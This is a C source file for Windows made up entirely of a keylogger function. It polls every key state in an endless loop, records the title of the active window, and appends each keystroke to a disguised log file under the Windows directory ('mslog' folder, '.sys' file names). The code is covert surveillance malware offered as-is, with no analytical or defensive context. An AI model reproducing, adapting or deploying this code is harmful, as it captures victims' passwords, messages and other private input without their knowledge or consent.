#include <windows.h>
#include <winuser.h>

void Keylogger(void);

void Keylogger(void)
{
	char			WindowsDir[MAX_PATH];
	char			LogDir[] = "\\mslog\\";
	SYSTEMTIME		SystemTime;
	char			LogFileName[11];
	HANDLE			LogFileHandle;
	short			KeyCode;
	char			CurrentWindow[200];
	char			CurrentWindowTemp[200];
	char			CurrentWindowText1[] = "\r\n\r\n{Current Window: ";
	char			CurrentWindowText2[] = "}\r\n";
	unsigned long	BytesWritten;
	char			OtherKey[20];

	if(GetWindowsDirectory(WindowsDir, sizeof(WindowsDir)) != 0)
	{
		lstrcat(WindowsDir, LogDir);

		if(SetCurrentDirectory(WindowsDir) == 0)
		{
			if(CreateDirectory(WindowsDir, 0) != 0)
			{
				SetCurrentDirectory(WindowsDir);
			}
		}

		GetSystemTime(&SystemTime);

		if(GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &SystemTime, "ddMMyy", LogFileName, sizeof(LogFileName)) != 0)
		{
			lstrcat(LogFileName, ".sys");
		}
		else
		{
			lstrcpy(LogFileName, "mslog.sys");	
		}

		LogFileHandle = CreateFile(LogFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

		if(LogFileHandle != 0)
		{
			SetFilePointer(LogFileHandle, 0, 0, FILE_END);

			while(lstrcmp(WindowsDir, "log it baby") != 0)
			{
				for(KeyCode = 0; KeyCode <= 255; KeyCode++)
				{
					if(GetAsyncKeyState(KeyCode) == -32767)
					{
						if(GetWindowText(GetForegroundWindow(), CurrentWindow, sizeof(CurrentWindow)) != 0)
						{
							if(lstrcmp(CurrentWindow, CurrentWindowTemp) != 0)
							{
								WriteFile(LogFileHandle, (char *)&CurrentWindowText1, lstrlen(CurrentWindowText1), &BytesWritten, 0);
								WriteFile(LogFileHandle, (char *)&CurrentWindow, lstrlen(CurrentWindow), &BytesWritten, 0);
								WriteFile(LogFileHandle, (char *)&CurrentWindowText2, lstrlen(CurrentWindowText2), &BytesWritten, 0);
								lstrcpy(CurrentWindowTemp, CurrentWindow);
							}
						}

						if(KeyCode >= 33 && KeyCode <= 64)
						{
							WriteFile(LogFileHandle, (char *)&KeyCode, 1, &BytesWritten, 0);
							break;
						}

						if(KeyCode >= 65 && KeyCode <=90)
						{
							KeyCode = KeyCode + 32;
							WriteFile(LogFileHandle, (char *)&KeyCode, 1, &BytesWritten, 0);
							break;
						}

						else
						{
							switch(KeyCode)
							{
								case VK_SPACE:
									lstrcpy(OtherKey, " ");
									break;

								case VK_RETURN:
									lstrcpy(OtherKey, "\r\n");
									break;

								case VK_TAB:
									lstrcpy(OtherKey, "{TAB}");
									break;

								case VK_SHIFT:
									lstrcpy(OtherKey, "{SHIFT}");
									break;

								case VK_CAPITAL:
									lstrcpy(OtherKey, "{CAPSLOCK}");
									break;

								case VK_BACK:
									lstrcpy(OtherKey, "{BACKSPACE}");
									break;

								case VK_DELETE:
									lstrcpy(OtherKey, "{DELETE}");
									break;

								case VK_CONTROL:
									lstrcpy(OtherKey, "{CTRL}");
									break;

								case VK_MENU:
									lstrcpy(OtherKey, "{ALT}");
									break;

								case VK_PAUSE:
									lstrcpy(OtherKey, "{PAUSE}");
									break;

								case VK_ESCAPE:
									lstrcpy(OtherKey, "{ESC}");
									break;

								case VK_INSERT:
									lstrcpy(OtherKey, "{INSERT}");
									break;

								case VK_NUMPAD0:
									lstrcpy(OtherKey, "0");
									break;

								case VK_NUMPAD1:
									lstrcpy(OtherKey, "1");
									break;

								case VK_NUMPAD2:
									lstrcpy(OtherKey, "2");
									break;

								case VK_NUMPAD3:
									lstrcpy(OtherKey, "3");
									break;

								case VK_NUMPAD4:
									lstrcpy(OtherKey, "4");
									break;

								case VK_NUMPAD5:
									lstrcpy(OtherKey, "5");
									break;

								case VK_NUMPAD6:
									lstrcpy(OtherKey, "6");
									break;

								case VK_NUMPAD7:
									lstrcpy(OtherKey, "7");
									break;

								case VK_NUMPAD8:
									lstrcpy(OtherKey, "8");
									break;

								case VK_NUMPAD9:
									lstrcpy(OtherKey, "9");
									break;

								case VK_ADD:
									lstrcpy(OtherKey, "+");
									break;

								case VK_SUBTRACT:
									lstrcpy(OtherKey, "-");
									break;

								case VK_DECIMAL:
									lstrcpy(OtherKey, "*");
									break;

								case VK_DIVIDE:
									lstrcpy(OtherKey, "/");
									break;

								case VK_NUMLOCK:
									lstrcpy(OtherKey, "{NUMLOCK}");
									break;

								case VK_SCROLL:
									lstrcpy(OtherKey, "{SCROLL}");
									break;

								default:
									break;
							}

							WriteFile(LogFileHandle, OtherKey, lstrlen(OtherKey), &BytesWritten, 0);
						}
					}
				}
			}
		}
	}

	return;
}